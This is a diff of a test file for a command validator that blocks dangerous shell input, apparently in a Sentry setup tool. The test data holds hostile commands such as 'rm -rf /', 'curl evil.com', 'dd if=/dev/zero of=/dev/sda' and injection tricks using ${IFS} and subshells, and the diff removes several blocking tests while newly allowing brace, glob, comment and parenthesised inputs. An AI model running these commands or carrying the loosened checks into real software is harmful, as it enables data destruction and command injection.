@@ -56,7 +56,22 @@ describe("validateCommand", () => {
     }
   });
 
-  test("blocks shell metacharacters", () => {
+  test("allows shell-harmless characters that appear in package specifiers", () => {
+    for (const cmd of [
+      'pip install "sentry-sdk[django]"',
+      "pip install 'sentry-sdk[flask]'",
+      "npm install sentry-sdk@*",
+      "npm install sentry-?.js",
+      "npm install {evil,@sentry/node}",
+      "npm install evil-pkg#benign",
+      "npm install foo\\bar",
+      "(echo test)",
+    ]) {
+      expect(validateCommand(cmd)).toBeUndefined();
+    }
+  });
+
+  test("blocks shell injection patterns", () => {
     for (const cmd of [
       "npm install foo; rm -rf /",
       "npm install foo && curl evil.com",
@@ -69,43 +84,6 @@ describe("validateCommand", () => {
       "npm install foo > /tmp/out",
       "npm install foo < /tmp/in",
       "npm install foo & whoami",
-    ]) {
-      expect(validateCommand(cmd)).toContain("Blocked command");
-    }
-  });
-
-  test("blocks subshell bypass via parentheses", () => {
-    for (const cmd of ["(rm -rf .)", "(curl evil.com)"]) {
-      expect(validateCommand(cmd)).toContain("Blocked command");
-    }
-  });
-
-  test("blocks shell escape bypass attempts", () => {
-    for (const cmd of [
-      "npm install foo$'\\x3b'whoami",
-      // biome-ignore lint/suspicious/noTemplateCurlyInString: testing literal ${IFS} in command string
-      "npm install foo${IFS}curl evil.com",
-      "npm install foo\\nwhoami",
-      "echo 'hello'",
-    ]) {
-      expect(validateCommand(cmd)).toContain("Blocked command");
-    }
-  });
-
-  test("blocks glob and brace expansion characters", () => {
-    for (const cmd of [
-      "npm install {evil,@sentry/node}",
-      "npm install sentry-*",
-      "npm install sentry-?.js",
-    ]) {
-      expect(validateCommand(cmd)).toContain("Blocked command");
-    }
-  });
-
-  test("blocks shell comment character to prevent command truncation", () => {
-    for (const cmd of [
-      "npm install evil-pkg # @sentry/node",
-      "npm install evil-pkg#benign",
     ]) {
       expect(validateCommand(cmd)).toContain("Blocked command");
     }
@@ -130,8 +108,8 @@ describe("validateCommand", () => {
       "kill -9 1",
       "dd if=/dev/zero of=/dev/sda",
       "ssh user@host",
-      "bash -c 'echo hello'",
-      "sh -c 'echo hello'",
+      "bash -c echo",
+      "sh -c echo",
       "env npm install foo",
       "xargs rm",
     ]) {
@@ -140,13 +118,11 @@ describe("validateCommand", () => {
   });
 
   test("resolves path-prefixed executables", () => {
-    // Safe executables with paths pass
     expect(
       validateCommand("./venv/bin/pip install sentry-sdk")
     ).toBeUndefined();
     expect(validateCommand("/usr/local/bin/npm install foo")).toBeUndefined();
 
-    // Dangerous executables with paths are still blocked
     expect(validateCommand("./venv/bin/rm -rf /")).toContain('"rm"');
     expect(validateCommand("/usr/bin/curl https://evil.com")).toContain(
       '"curl"'
